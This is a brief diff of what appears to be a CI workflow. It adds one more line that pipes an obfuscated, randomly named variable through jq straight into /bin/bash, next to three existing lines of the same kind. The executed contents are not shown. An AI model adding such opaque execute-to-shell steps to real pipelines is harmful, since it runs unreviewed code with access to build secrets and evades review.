@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$sfob60158" | jq -r .xnzn37 | /bin/bash
           echo $u49212 | jq -r .ljj30 | /bin/bash
           echo $unx7328 | jq -r .dug44122 | /bin/bash
+          echo $anjtn5 | jq -r .dwzt40450 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
